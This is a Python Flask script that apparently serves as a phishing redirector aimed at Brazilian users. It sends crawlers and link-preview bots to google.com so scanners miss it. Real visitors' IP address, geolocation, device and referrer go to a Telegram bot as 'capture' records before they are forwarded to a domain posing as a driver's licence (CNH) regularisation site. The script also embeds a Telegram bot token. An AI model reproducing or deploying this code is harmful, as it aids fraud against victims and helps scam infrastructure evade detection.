import datetime
import os
from flask import Flask, request, redirect
import requests
import pytz  # Substitui o import do ast

app = Flask(__name__)

# --- CONFIGURAÇÕES ---
TELEGRAM_TOKEN = '8906811429:AAE5xELLBsXG_lu-Pve0XLRWIHzeJlqC8xc'
TELEGRAM_CHAT_ID = '8535923335'
URL_DESTINO = 'https://regularizecnh.org'

BOT_KEYWORDS = [
    'bot', 'crawl', 'spider', 'slurp', 'google', 'bing', 'yahoo', 'facebook', 
    'whatsapp', 'telegram', 'microsoft', 'linkedin', 'slack', 'twitter', 'bot-http'
]

def is_bot(user_agent):
    if not user_agent:
        return True
    ua = user_agent.lower()
    return any(keyword in ua for keyword in BOT_KEYWORDS)

def send_telegram(data):
    geo = "Desconhecido"
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{data['ip']}", timeout=3).json()
        if geo_res.get('status') == 'success':
            geo = f"{geo_res.get('city')} - {geo_res.get('regionName')}"
    except:
        pass
    
    msg = (
        f"🕷️ ** Registro de captura!🕸️**\n\n"
        f"🌐 IP: {data['ip']}\n"
        f"📍 Local: {geo}\n"
        f"📱 Dispositivo: {data['ua']}\n"
        f"🔗 Origem: {data['referer']}\n"
        f"⏰ Data: {data['data']}"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})

@app.route('/')
@app.route('/<path:path>')
def bridge(path=""):
    # Evita duplicidade por causa do favicon.ico ou arquivos de imagem/css
    if path == 'favicon.ico' or path.endswith(('.ico', '.png', '.jpg', '.css', '.js')):
        return redirect('https://www.google.com', code=302)

    ua = request.headers.get('User-Agent', '')
    
    if is_bot(ua):
        return redirect('https://www.google.com', code=302)

    # Correção do Fuso Horário
    br_tz = pytz.timezone('America/Sao_Paulo')
    data_br = datetime.datetime.now(br_tz).strftime("%d/%m/%Y %H:%M:%S")

    lead_data = {
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0],
        'ua': ua,
        'referer': request.headers.get('Referer', 'Direto/Não informado'),
        'data': data_br
    }

    try:
        send_telegram(lead_data)
    except:
        pass

    return redirect(URL_DESTINO, code=302)

if __name__ == "__main__":
    app.run()
